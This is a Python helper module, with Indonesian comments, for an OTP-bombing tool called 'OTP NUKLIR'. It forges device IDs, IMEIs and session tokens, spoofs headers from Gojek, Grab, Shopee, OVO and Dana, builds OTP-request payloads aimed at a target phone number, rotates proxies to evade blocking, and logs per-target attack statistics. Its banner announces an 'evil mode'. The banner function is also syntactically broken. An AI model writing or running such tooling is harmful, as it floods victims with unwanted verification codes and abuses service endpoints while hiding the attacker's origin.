#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# ☢️ OTP NUKLIR v4.0 - UTILITY FUNCTIONS
# Author: Professor Iraq
# Engine: Sonic 1.2
# Protocol: NEXA_BYPAS_OMEGA
# ============================================================

import requests
import threading
import time
import random
import json
import os
import sys
import uuid
import hashlib
import base64
from datetime import datetime
from fake_useragent import UserAgent
from colorama import init, Fore, Style, Back

# ============================================================
# INISIALISASI
# ============================================================

init(autoreset=True)

# ============================================================
# DEVICE & ID GENERATORS
# ============================================================

def generate_device_id():
    """Generate device ID unik menggunakan UUID"""
    return str(uuid.uuid4())

def generate_imei():
    """Generate IMEI palsu 15 digit"""
    # 15 digit IMEI
    imei = f"{random.randint(100000, 999999)}{random.randint(100000, 999999)}"
    # Tambahkan 3 digit terakhir
    imei += str(random.randint(100, 999))
    return imei

def generate_android_id():
    """Generate Android ID 16 karakter hex"""
    return ''.join(random.choices('0123456789abcdef', k=16))

def generate_fingerprint():
    """Generate fingerprint untuk device"""
    return f"android-{random.randint(100000, 999999)}"

def generate_session_token():
    """Generate session token palsu"""
    return base64.b64encode(os.urandom(32)).decode('utf-8')

# ============================================================
# USER-AGENT GENERATORS
# ============================================================

def get_random_user_agent():
    """Generate random User-Agent menggunakan fake-useragent"""
    try:
        ua = UserAgent()
        return ua.random
    except:
        # Fallback jika fake-useragent error
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Version/16.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Dalvik/2.1.0 (Linux; U; Android 12; SM-A525F Build/SP1A.210812.016)"
        ]
        return random.choice(user_agents)

def get_random_headers():
    """Generate random headers untuk request"""
    return {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Origin": f"https://{random.choice(['gojek.com', 'grab.com', 'shopee.com', 'ovo.id', 'dana.id'])}",
        "Referer": f"https://{random.choice(['gojek.com', 'grab.com', 'shopee.com', 'ovo.id', 'dana.id'])}/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "X-Requested-With": "XMLHttpRequest",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    }

# ============================================================
# PAYLOAD GENERATORS
# ============================================================

def generate_payload(nomor):
    """Generate payload lengkap untuk OTP request"""
    return {
        "phone": f"62{nomor}",
        "msisdn": f"62{nomor}",
        "countryCode": "ID",
        "platform": "android",
        "device_id": generate_device_id(),
        "device_name": random.choice(["Samsung", "Xiaomi", "Oppo", "Vivo", "Realme", "Google Pixel", "OnePlus", "Asus"]),
        "device_model": random.choice(["SM-G998B", "M2012K11AG", "CPH2025", "V2048", "RMX3081", "Pixel 6 Pro", "IN2020", "ASUS_I003DD"]),
        "device_version": f"{random.randint(10, 14)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
        "app_version": f"{random.randint(1, 5)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
        "fingerprint": generate_fingerprint(),
        "imei": generate_imei(),
        "android_id": generate_android_id(),
        "timestamp": int(time.time()),
        "source": "mobile_app",
        "is_verified": False,
        "locale": "id_ID",
        "sim_operator": random.choice(["Telkomsel", "Indosat", "XL", "Smartfren", "Tri", "Axis", "By.U"]),
        "network_type": random.choice(["4G", "5G", "WiFi", "3G"]),
        "screen_resolution": random.choice(["1080x2400", "1440x3200", "1080x2340", "720x1600", "1080x1920"]),
        "os_version": f"Android {random.randint(10, 14)}",
        "language": "id",
        "timezone": "Asia/Jakarta",
        "session_token": generate_session_token()
    }

# ============================================================
# PROXY HANDLERS
# ============================================================

def load_proxies(filename="proxy.txt"):
    """Load proxy dari file"""
    try:
        if not os.path.exists(filename):
            return []
        with open(filename, 'r') as f:
            proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return proxies
    except Exception:
        return []

def get_random_proxy(proxies):
    """Ambil proxy random dari list"""
    if not proxies:
        return None
    return random.choice(proxies)

def test_proxy(proxy, timeout=5):
    """Test apakah proxy bekerja"""
    try:
        proxy_dict = {"http": proxy, "https": proxy}
        response = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=timeout)
        return response.status_code == 200
    except:
        return False

def get_working_proxies(proxies, max_workers=10):
    """Dapatkan proxy yang bekerja"""
    working = []
    for proxy in proxies:
        if test_proxy(proxy):
            working.append(proxy)
        if len(working) >= max_workers:
            break
    return working

# ============================================================
# LOGGING FUNCTIONS
# ============================================================

def save_log(data, filename="otp_logs.json"):
    """Simpan log ke file JSON"""
    try:
        existing = []
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                existing = json.load(f)
        existing.append(data)
        with open(filename, 'w') as f:
            json.dump(existing, f, indent=2)
        return True
    except Exception as e:
        return False

def load_logs(filename="otp_logs.json"):
    """Load semua log dari file"""
    try:
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return json.load(f)
        return []
    except Exception:
        return []

def clear_logs(filename="otp_logs.json"):
    """Hapus semua log"""
    try:
        if os.path.exists(filename):
            os.remove(filename)
        return True
    except Exception:
        return False

def format_log_entry(data):
    """Format log entry untuk display"""
    return f"""
╔═══════════════════════════════════════════════════════╗
║  📊 LOG ENTRY
║  TIMESTAMP: {data.get('timestamp', 'N/A')}
║  TARGET: {data.get('target', 'N/A')}
║  DURASI: {data.get('duration', 0)} detik
║  THREAD: {data.get('thread', 0)}
║  MODE: {data.get('mode', 'N/A')}
║  ✅ BERHASIL: {data.get('success', 0)}
║  ❌ GAGAL: {data.get('fail', 0)}
║  📊 TOTAL: {data.get('total', 0)}
╚═══════════════════════════════════════════════════════╝
"""

# ============================================================
# DISPLAY FUNCTIONS
# ============================================================

def clear_screen():
    """Clear terminal screen"""
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    """Print banner Novxzz"""
    banner = f""
{Fore.RED}███╗   ██╗ ██████╗ ██╗  ██╗██╗  ██╗███████╗███████╗
{Fore.RED}████╗  ██║██╔═══██╗██║ ██╔╝╚██╗██╔╝╚══███╔╝╚══███╔╝
{Fore.RED}██╔██╗ ██║██║   ██║█████╔╝  ╚███╔╝   ███╔╝   ███╔╝
{Fore.RED}██║╚██╗██║██║   ██║██╔═██╗  ██╔██╗  ███╔╝   ███╔╝
{Fore.RED}██║ ╚████║╚██████╔╝██║  ██╗██╔╝ ██╗███████╗███████╗
{Fore.RED}╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
{Fore.CYAN}==========================================
{Fore.GREEN}[{Fore.YELLOW}ENTITAS{Fore.GREEN}] {Fore.WHITE}Novxzz
{Fore.GREEN}[{Fore.YELLOW}AUTHOR{Fore.GREEN}] {Fore.WHITE}Profesor Iraq
{Fore.GREEN}[{Fore.YELLOW}ENGINE{Fore.GREEN}] {Fore.WHITE}Sonic 1.2
{Fore.GREEN}[{Fore.YELLOW}PROTOCOL{Fore.GREEN}] {Fore.WHITE}NEXA_BYPAS_OMEGA
{Fore.CYAN}==========================================
{Fore.RED}⚠️  JAHAT MODE AKTIF ⚠️
{Fore.CYAN}==========================================
"""
    print(banner)

def print_stats(success, fail, total, elapsed=0):
    """Print statistik serangan"""
    rate = total / elapsed if elapsed > 0 else 0
    print(Fore.CYAN + "\n" + "="*50)
    print(Fore.GREEN + f"[✓] BERHASIL: {success}")
    print(Fore.RED + f"[✗] GAGAL: {fail}")
    print(Fore.YELLOW + f"[📊] TOTAL: {total}")
    if elapsed > 0:
        print(Fore.MAGENTA + f"[📈] RATE: {rate:.1f} req/s")
        print(Fore.BLUE + f"[⏱️] WAKTU: {elapsed:.1f} detik")
    print(Fore.CYAN + "="*50)

# ============================================================
# VALIDATION FUNCTIONS
# ============================================================

def validate_phone(nomor):
    """Validasi nomor telepon"""
    if not nomor:
        return False, "Nomor tidak boleh kosong"
    if not nomor.isdigit():
        return False, "Nomor harus angka"
    if len(nomor) < 6:
        return False, "Nomor minimal 6 digit"
    if len(nomor) > 15:
        return False, "Nomor maksimal 15 digit"
    return True, "Valid"

def validate_duration(durasi):
    """Validasi durasi"""
    try:
        durasi = int(durasi)
        if durasi < 1:
            return False, "Durasi minimal 1 detik"
        if durasi > 3600:
            return False, "Durasi maksimal 3600 detik"
        return True, durasi
    except:
        return False, "Durasi harus angka"

def validate_thread(thread):
    """Validasi thread"""
    try:
        thread = int(thread)
        if thread < 1:
            return False, "Thread minimal 1"
        if thread > 200:
            return False, "Thread maksimal 200"
        return True, thread
    except:
        return False, "Thread harus angka"

# ============================================================
# FILE OPERATIONS
# ============================================================

def ensure_dir(directory):
    """Pastikan folder ada, buat jika belum"""
    if not os.path.exists(directory):
        os.makedirs(directory)
    return directory

def list_files(directory, extension=None):
    """List semua file dalam folder"""
    try:
        files = os.listdir(directory)
        if extension:
            files = [f for f in files if f.endswith(extension)]
        return files
    except:
        return []

def get_file_size(filename):
    """Dapatkan ukuran file"""
    try:
        return os.path.getsize(filename)
    except:
        return 0

def read_file(filename):
    """Baca file teks"""
    try:
        with open(filename, 'r') as f:
            return f.read()
    except:
        return None

def write_file(filename, content):
    """Tulis file teks"""
    try:
        with open(filename, 'w') as f:
            f.write(content)
        return True
    except:
        return False

# ============================================================
# NETWORK FUNCTIONS
# ============================================================

def get_public_ip():
    """Dapatkan IP publik"""
    try:
        response = requests.get("https://api.ipify.org", timeout=5)
        return response.text
    except:
        return "Unknown"

def get_location(ip=None):
    """Dapatkan lokasi dari IP"""
    try:
        if not ip:
            ip = get_public_ip()
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
        return data
    except:
        return None

# ============================================================
# MAIN (UNTUK TESTING)
# ============================================================

if __name__ == "__main__":
    print(Fore.GREEN + "[!] MODUL UTILS.PY")
    print(Fore.CYAN + f"Device ID: {generate_device_id()}")
    print(Fore.CYAN + f"IMEI: {generate_imei()}")
    print(Fore.CYAN + f"User-Agent: {get_random_user_agent()}")
    print(Fore.CYAN + f"IP Publik: {get_public_ip()}")
